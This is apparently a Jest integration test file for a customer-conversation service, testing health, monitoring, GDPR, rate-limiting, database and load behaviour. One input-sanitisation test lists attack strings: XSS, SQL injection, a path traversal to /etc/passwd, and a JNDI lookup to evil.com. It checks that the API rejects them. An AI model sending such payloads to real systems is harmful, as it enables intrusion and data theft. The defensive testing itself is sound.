/**
 * Integration Tests for ConversationIQ
 * Tests complete workflows across multiple services
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
import request from 'supertest';
import { TestFramework, testConfigs } from './test-framework';
import { createServer } from '../api/server';
import { DatabaseService } from '../services/database';
import { Application } from 'express';
import { Server } from 'http';

// Test framework and application instances
const testFramework = new TestFramework(testConfigs.integration);
let app: Application;
let server: Server;
let stopServer: () => Promise<void>;

beforeAll(async () => {
  console.log('🚀 Setting up integration test environment...');
  
  // Create test server
  const serverSetup = await createServer();
  app = serverSetup.app;
  server = await serverSetup.startServer(0); // Use random available port
  stopServer = serverSetup.stopServer;
  
  // Setup test framework
  await testFramework.setupTest('integration-tests-global');
}, 30000);

afterAll(async () => {
  console.log('🧹 Cleaning up integration test environment...');
  
  await stopServer();
  await testFramework.cleanupTest('integration-tests-global');
}, 10000);

describe('Integration Tests - API Server', () => {
  beforeEach(async () => {
    await testFramework.setupTest('api-integration');
  });

  describe('Health Check Endpoints', () => {
    test('should return comprehensive health status', async () => {
      const benchmark = await testFramework.benchmarkOperation('api_response', async () => {
        const response = await request(app)
          .get('/health')
          .expect(200);

        expect(response.body).toHaveProperty('status');
        expect(response.body).toHaveProperty('timestamp');
        expect(response.body).toHaveProperty('services');
      });

      expect(benchmark.passed).toBe(true);
    });

    test('should handle health check load', async () => {
      const loadTest = await testFramework.runLoadTest(
        'health_check_load',
        async () => {
          const response = await request(app)
            .get('/health')
            .expect(200);
          return response.body;
        },
        {
          concurrentUsers: 10,
          duration: 5,
          rampUpTime: 1,
        }
      );

      expect(loadTest.passed).toBe(true);
      expect(loadTest.metrics.errorRate).toBeLessThan(1);
    });
  });

  describe('Monitoring Endpoints', () => {
    test('should provide monitoring dashboard data', async () => {
      const response = await request(app)
        .get('/monitoring/dashboard')
        .expect(200);

      expect(response.body).toHaveProperty('metrics');
      expect(response.body).toHaveProperty('healthChecks');
      expect(response.body).toHaveProperty('slas');
      expect(response.body).toHaveProperty('businessMetrics');
      expect(response.body).toHaveProperty('timestamp');
    });

    test('should return performance metrics', async () => {
      const response = await request(app)
        .get('/monitoring/performance')
        .expect(200);

      expect(response.body).toHaveProperty('api');
      expect(response.body).toHaveProperty('ai');
      expect(response.body).toHaveProperty('system');
      expect(response.body.api).toHaveProperty('responseTime');
      expect(response.body.api).toHaveProperty('successRate');
    });

    test('should export metrics in Prometheus format', async () => {
      const response = await request(app)
        .get('/monitoring/export?format=prometheus')
        .expect(200);

      expect(response.headers['content-type']).toContain('text/plain');
      expect(response.text).toContain('# HELP');
      expect(response.text).toContain('# TYPE');
    });
  });

  describe('Privacy/GDPR Endpoints', () => {
    let testEmail: string;

    beforeEach(() => {
      testEmail = `test-${Date.now()}@example.com`;
    });

    test('should handle data access request', async () => {
      // First create some test data
      const database = new DatabaseService();
      await database.connect();
      
      const testData = TestFramework.createTestData();
      const conversation = await database.createConversation(
        testData.conversation({
          customerId: testEmail,
          metadata: { customerEmail: testEmail },
        })
      );

      // Request data access
      const response = await request(app)
        .get(`/privacy/data-access/${testEmail}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body).toHaveProperty('exportDate');
    });

    test('should handle data deletion request', async () => {
      // Create test data first
      const database = new DatabaseService();
      await database.connect();
      
      const testData = TestFramework.createTestData();
      await database.createConversation(
        testData.conversation({
          customerId: testEmail,
          metadata: { customerEmail: testEmail },
        })
      );

      // Request data deletion
      const response = await request(app)
        .delete('/privacy/data-deletion')
        .send({ email: testEmail })
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('deletedRecords');
    });

    test('should handle consent management', async () => {
      const consentData = {
        userId: '12345678-1234-1234-1234-123456789012',
        consentType: 'analytics',
        granted: true,
      };

      const response = await request(app)
        .post('/privacy/consent')
        .send(consentData)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body.consentRecorded).toMatchObject(consentData);
    });

    test('should validate GDPR request inputs', async () => {
      // Test invalid email format
      await request(app)
        .get('/privacy/data-access/invalid-email')
        .expect(400);

      // Test missing required fields in consent
      await request(app)
        .post('/privacy/consent')
        .send({ userId: 'invalid-uuid' })
        .expect(400);
    });

    test('should handle GDPR request load', async () => {
      const loadTest = await testFramework.runLoadTest(
        'gdpr_requests_load',
        async () => {
          const response = await request(app)
            .get('/privacy/policy')
            .expect(200);
          return response.body;
        },
        {
          concurrentUsers: 5,
          duration: 3,
          rampUpTime: 1,
        }
      );

      expect(loadTest.passed).toBe(true);
    });
  });

  describe('Security Endpoints', () => {
    test('should enforce rate limiting', async () => {
      const endpoint = '/health';
      const requests = [];

      // Make many requests quickly to trigger rate limiting
      for (let i = 0; i < 1100; i++) { // Exceed the 1000 request limit
        requests.push(request(app).get(endpoint));
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should sanitize malicious inputs', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users; --',
        '../../etc/passwd',
        '${jndi:ldap://evil.com}',
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .get(`/privacy/data-access/${encodeURIComponent(maliciousInput)}`)
          .expect(400); // Should be rejected by validation

        expect(response.body).toHaveProperty('error');
      }
    });

    test('should include security headers', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      // Check for important security headers
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('strict-transport-security');
    });
  });

  describe('Error Handling', () => {
    test('should handle 404 errors gracefully', async () => {
      const response = await request(app)
        .get('/nonexistent-endpoint')
        .expect(404);

      expect(response.body).toHaveProperty('error', 'Not Found');
      expect(response.body).toHaveProperty('timestamp');
    });

    test('should handle server errors gracefully', async () => {
      // This would test an endpoint that might throw an error
      // For now, we'll simulate by testing with invalid data
      const response = await request(app)
        .delete('/privacy/data-deletion')
        .send({ /* missing required email field */ })
        .expect(400);

      expect(response.body).toHaveProperty('error');
    });

    test('should handle database disconnection gracefully', async () => {
      // This is a complex test that would require mocking database failures
      // For now, we'll ensure the health check can report database issues
      const response = await request(app)
        .get('/monitoring/dashboard')
        .expect(200);

      expect(response.body.healthChecks).toBeDefined();
    });
  });
});

describe('Integration Tests - Database Layer', () => {
  let database: DatabaseService;

  beforeEach(async () => {
    await testFramework.setupTest('database-integration');
    database = new DatabaseService();
    await database.connect();
  });

  describe('Transaction Handling', () => {
    test('should handle complex multi-table operations', async () => {
      const testData = TestFramework.createTestData();
      
      const benchmark = await testFramework.benchmarkOperation('database_query', async () => {
        // Create conversation
        const conversation = await database.createConversation(
          testData.conversation()
        );

        // Create multiple messages
        const messages = await Promise.all([
          database.createMessage(testData.message(conversation.id, { content: 'Message 1' })),
          database.createMessage(testData.message(conversation.id, { content: 'Message 2' })),
          database.createMessage(testData.message(conversation.id, { content: 'Message 3' })),
        ]);

        // Add AI analysis to each message
        await Promise.all(messages.map(message => 
          database.addAIAnalysis(message.id, testData.aiAnalysis())
        ));

        return { conversation, messages };
      });

      expect(benchmark.passed).toBe(true);
    });

    test('should handle concurrent database operations', async () => {
      const testData = TestFramework.createTestData();
      
      // Create multiple conversations concurrently
      const operations = Array.from({ length: 20 }, (_, i) =>
        database.createConversation(testData.conversation({
          ticketId: `concurrent-integration-${i}`,
        }))
      );

      const results = await Promise.allSettled(operations);
      const successfulOps = results.filter(r => r.status === 'fulfilled');
      
      expect(successfulOps.length).toBe(20);
    });

    test('should maintain data integrity under load', async () => {
      const testData = TestFramework.createTestData();
      
      const loadTest = await testFramework.runLoadTest(
        'database_integrity_load',
        async () => {
          const conversation = await database.createConversation(
            testData.conversation({
              ticketId: `load-test-${Date.now()}-${Math.random()}`,
            })
          );
          
          await database.createMessage(
            testData.message(conversation.id)
          );
          
          return conversation;
        },
        {
          concurrentUsers: 10,
          duration: 5,
          rampUpTime: 1,
        }
      );

      expect(loadTest.passed).toBe(true);
      expect(loadTest.metrics.errorRate).toBeLessThan(5);
    });
  });

  describe('Data Encryption Integration', () => {
    test('should encrypt PII data automatically', async () => {
      const testData = TestFramework.createTestData();
      
      const message = await database.createMessage(testData.message('test-conv-id', {
        content: 'Contact me at sensitive@example.com or 555-123-4567',
      }));

      // In production environment, content should be encrypted
      expect(message.content).toBeDefined();
      
      // We can't easily test the actual encryption without production config,
      // but we can verify the operation completed successfully
    });

    test('should handle GDPR operations end-to-end', async () => {
      const email = `integration-test-${Date.now()}@example.com`;
      const testData = TestFramework.createTestData();
      
      // Create data for the email
      const conversation = await database.createConversation(
        testData.conversation({
          customerId: email,
          metadata: { customerEmail: email },
        })
      );

      await database.createMessage(
        testData.message(conversation.id, {
          content: `User email: ${email}, needs support`,
        })
      );

      // Test access request
      const accessData = await database.handleDataSubjectAccessRequest(email);
      expect(accessData).toBeDefined();

      // Test deletion request
      const deletionResult = await database.handleDataSubjectDeletionRequest(email);
      expect(deletionResult.success).toBe(true);
      expect(deletionResult.deletedRecords).toBeGreaterThan(0);
    });
  });
});

describe('Integration Tests - Monitoring and Compliance', () => {
  beforeEach(async () => {
    await testFramework.setupTest('monitoring-integration');
  });

  test('should integrate monitoring across all services', async () => {
    const database = new DatabaseService();
    await database.connect();
    
    const testData = TestFramework.createTestData();
    
    // Perform operations that should generate metrics
    const conversation = await database.createConversation(testData.conversation());
    const message = await database.createMessage(testData.message(conversation.id));
    await database.addAIAnalysis(message.id, testData.aiAnalysis());

    // Check that monitoring captured the operations
    const dashboardData = testFramework.generateTestReport();
    expect(dashboardData.summary.totalTests).toBeGreaterThan(0);
  });

  test('should handle security scanning integration', async () => {
    const securityTest = await testFramework.runSecurityTest('integration_security_scan');
    
    expect(securityTest.testName).toBe('integration_security_scan');
    expect(securityTest).toHaveProperty('passed');
    expect(securityTest).toHaveProperty('vulnerabilities');
    expect(securityTest).toHaveProperty('complianceScore');
  });

  test('should track performance across integration workflows', async () => {
    const performanceTest = await testFramework.benchmarkOperation('api_response', async () => {
      // Simulate a complete API workflow
      const response = await request(app)
        .get('/monitoring/dashboard');

      expect(response.status).toBe(200);
      return response.body;
    });

    expect(performanceTest.passed).toBe(true);
    expect(performanceTest.metrics.responseTime).toBeLessThan(500);
  });
});

describe('Integration Tests - Error Recovery', () => {
  beforeEach(async () => {
    await testFramework.setupTest('error-recovery-integration');
  });

  test('should recover from service failures gracefully', async () => {
    // Test health check endpoint during simulated service degradation
    let responses = [];
    
    for (let i = 0; i < 5; i++) {
      const response = await request(app)
        .get('/monitoring/health')
        .timeout(5000);
      
      responses.push(response);
      
      // Small delay between requests
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    // All requests should complete (may be degraded but not failed)
    const completedResponses = responses.filter(r => r.status < 500);
    expect(completedResponses.length).toBeGreaterThan(0);
  });

  test('should maintain data consistency during failures', async () => {
    const database = new DatabaseService();
    await database.connect();
    
    const testData = TestFramework.createTestData();
    
    try {
      // Attempt operations that might fail
      const operations = Array.from({ length: 10 }, (_, i) =>
        database.createConversation(testData.conversation({
          ticketId: `failure-test-${i}`,
        }))
      );

      const results = await Promise.allSettled(operations);
      const successCount = results.filter(r => r.status === 'fulfilled').length;
      
      // At least some operations should succeed
      expect(successCount).toBeGreaterThan(0);
      
    } catch (error) {
      // If there are errors, they should be handled gracefully
      expect(error).toBeDefined();
    }
  });
});

describe('Integration Tests - Performance Under Load', () => {
  test('should handle realistic load scenarios', async () => {
    const loadTest = await testFramework.runLoadTest(
      'realistic_api_load',
      async () => {
        // Simulate realistic API usage pattern
        const endpoints = [
          '/health',
          '/monitoring/performance', 
          '/privacy/policy',
          '/monitoring/dashboard',
        ];
        
        const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
        const response = await request(app).get(endpoint);
        
        return response.body;
      },
      {
        concurrentUsers: 25,
        duration: 10,
        rampUpTime: 3,
      }
    );

    expect(loadTest.passed).toBe(true);
    expect(loadTest.metrics.averageResponseTime).toBeLessThan(1000);
    expect(loadTest.metrics.errorRate).toBeLessThan(2);
  });

  test('should scale monitoring under high metric volume', async () => {
    const benchmark = await testFramework.benchmarkOperation('api_response', async () => {
      // Generate high volume of metrics
      const operations = Array.from({ length: 500 }, (_, i) => {
        return new Promise<void>(resolve => {
          setImmediate(() => {
            // These operations would normally generate metrics
            request(app).get('/health').end(() => resolve());
          });
        });
      });

      await Promise.all(operations);
    });

    expect(benchmark.passed).toBe(true);
    expect(benchmark.metrics.memoryUsage).toBeLessThan(256); // Under 256MB
  });
});